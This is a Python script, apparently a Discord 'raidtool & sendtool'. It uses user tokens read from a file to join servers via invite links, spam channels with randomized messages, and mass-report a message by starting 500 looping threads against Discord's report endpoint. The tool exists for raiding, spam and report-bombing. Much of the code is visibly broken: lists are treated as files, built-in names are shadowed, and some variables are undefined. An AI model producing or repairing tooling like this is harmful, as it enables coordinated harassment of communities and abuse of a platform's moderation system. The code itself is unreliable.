import requests
import colorama
import os
import ctypes
from colorama import Fore, Style
from sys import stdout
from requests import Session
from time import strftime, gmtime, sleep
import random
import threading
import io,sys
sys.stdout = io.TextIOWrapper(sys.stdout.buffer, encoding='utf-8')









import urllib3
from urllib3.exceptions import InsecureRequestWarning
urllib3.disable_warnings(InsecureRequestWarning)









b = Style.BRIGHT
os = os.system
os('cls')









def subtraction(x, y):
    return x - y

print(f"""
{b+Fore.BLUE} > Creator: zeara
this program is raidtool & sendtool

[1]raid
[2]send
[3]report
{Fore.RESET}""")

choice = input(f"{b+Fore.BLUE}1 or 2:{Fore.RESET}")


if choice == '1':
  while True:
    serverinvite = input(f"{b+Fore.BLUE}invitelink:{Fore.RESET}")
    len = len(serverinvite)
    inviteword = subtraction(len,19)
    invite = serverinvite[19:inviteword]
    userToken = open("tokens.txt").read().splitlines()
    token = userToken.readlines()
    tokens = random.choice(token)
    headers = {'Authorization': tokens} 
    r = requests.get(f'https://discord.com/api/v9/invites/{invite}', headers=headers)


if choice == '2':
  tokens
  guild = input(f"{b+Fore.BLUE}guildid:{Fore.RESET}")
  userToken = open("tokens.txt").read().splitlines()
  token = userToken.readlines()
  tokens = random.choice(token)
  sendmessages = open("messages.txt").read().splitlines()
  message = sendmessages.readlines()
  messages = f"{random.choice(message)}{random.choice(range(10000000000,99999999999))}"
  sendchannels = open("channels.txt").read().splitlines()
  channel = sendchannels.readlines()
  channels = random.choice(channel)
  headers = {'Authorization': tokens, 'Content-Type':  'application/json', "content": messages}
  r = requests.get(f'https://discord.com/api/v9/channels/{guild}/{channels}', headers=headers)
  if r.status_code == 200:
    print("success")
  elif r.status_code == 404:
    print("id or channel is different.")


if choice == '3':
    userToken = open("tokens.txt").read().splitlines()
    tokens = userToken.readlines()
    token = random.choice(token)
    guildId = input(f"{b+Fore.BLUE} Server ID: ")
    channelId = input(f"{b+Fore.BLUE}Channel ID: ")
    messageId = input(f"{b+Fore.BLUE}Message ID: ")
    reason = input(f"{b+Fore.BLUE}Reason: ")

    headers = {
        "Content-Type" : "application/json",
        "Authorization" : token,
        "User-Agent" : "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:87.0) Gecko/20100101 Firefox/87.0"
    }

    payload = {"guild_id" : guildId, "channel_id" : channelId, "message_id" : messageId, "reason" : reason}

    def report():
        while True:
            response = requests.post(
                'https://discord.com/api/v9/report',
                headers = headers,
                json = payload
            )
            if response.status_code == 201:
                print(f"{b+Fore.BLUE}Report sent successfully")
            elif response.status_code == 429:
                print(f"{b+Fore.BLUE}Rate Limited, waiting 5 seconds")
                sleep(5)
            elif response.status_code == 401:
                print(f"{b+Fore.BLUE} Invalid Token")
                return
            else:
                print(f"{b+Fore.BLUE}Unknown Error: {response.status_code}")

    for i in range(500):
      threading.Thread(target = report).start()
